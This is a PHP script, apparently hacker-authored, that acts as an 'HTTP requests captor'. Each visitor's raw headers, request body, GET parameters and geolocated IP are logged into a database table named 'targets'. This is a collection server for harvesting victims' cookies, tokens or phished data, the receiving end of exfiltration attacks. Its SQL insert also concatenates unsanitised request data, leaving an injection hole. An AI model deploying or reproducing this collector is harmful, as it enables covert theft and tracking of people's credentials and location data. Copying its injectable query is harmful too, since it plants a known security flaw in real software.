<?php

/*
*   If you're reading this if this helped you don't ignore that message
* Help me with some hacking Tips/Tricks or resources to gain my knowledge
*         My facebook : https://www.facebook.com/000xPlan
*              My Github : https://github.com/CXVVMVII
*                    Made By @WhizzHandrixx
*/

include 'mydb.php';


/*
*  HTTP REQUESTS CAPTOR
*/


$http_request = new http_request();
$resp = $http_request->raw();

class http_request {
  var $add_headers = array('CONTENT_TYPE', 'CONTENT_LENGTH');
  function http_request($add_headers = false) {
             $this->retrieve_headers($add_headers);
             $this->body = @file_get_contents('php://input');
  }
  
  function retrieve_headers($add_headers = false) {
    
    if ($add_headers) {
      $this->add_headers = array_merge($this->add_headers, $add_headers);
    }
  
    if (isset($_SERVER['HTTP_METHOD'])) {
      $this->method = $_SERVER['HTTP_METHOD'];
      unset($_SERVER['HTTP_METHOD']);
    } else {
      $this->method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : false;
    }
    $this->protocol = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : false;
    $this->request_method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : false;
    
    $this->headers = array();
    foreach($_SERVER as $i=>$val) {
      if (strpos($i, 'HTTP_') === 0 || in_array($i, $this->add_headers)) {
        $name = str_replace(array('HTTP_', '_'), array('', '-'), $i);
        $this->headers[$name] = $val;
      }
    }
  }
  
  function method() {
    return $this->method;
  }
  
  function body() {
    return $this->body;
  }
  
  
  function header($name) {
    $name = strtoupper($name);
    return isset($this->headers[$name]) ? $this->headers[$name] : false;
  }
  
  function headers() {
    return $this->headers;
  }
 
  function raw($refresh = false) {
  
    if (isset($this->raw) && !$refresh) {
      return $this->raw; // return cached
    }
  
    $headers = $this->headers();
    $this->raw = "{$this->method}\r\n";
    
    foreach($headers as $i=>$header) {
        $this->raw .= "$i: $header\r\n";
    }
    
    $this->raw .= "\r\n{$this->body}";
    return $this->raw;
  }
}


$headers = nl2br($resp)."\n\r".file_get_contents('php://input');



/*
*    GET IP DETAILS
*/


$url = 'https://freegeoip.app/json/'.$_SERVER['REMOTE_ADDR'];
$json = file_get_contents($url);
$obj = json_decode($json);

$today = date("Y/m/d") ." at " . date("h:i:sa");

/*
*
*
*
*/


function magic_function($k, $v){
       // Thank to Younes Eip for helping me for this
       return $v . "=" . $k ;
}

$result = implode("\n", array_map('magic_function', $_GET ,array_keys($_GET)));

/*
* INSERT DEATAILS TO DB
*/

$heap = $headers."\n\r-------\n\r"."</br>".$result."</br>";
$insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."',  '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$heap."')";
$mysq = mysqli_query($db_con ,$insert);




?>

<!-- 
/*
*   If you're reading this if this helped you don't ignore that message
* Help me with some hacking Tips/Tricks or resources to gain my knowledge
*         My facebook : https://www.facebook.com/000xPlan
*              My Github : https://github.com/CXVVMVII
*                    Made By @WhizzHandrixx
*/
-->




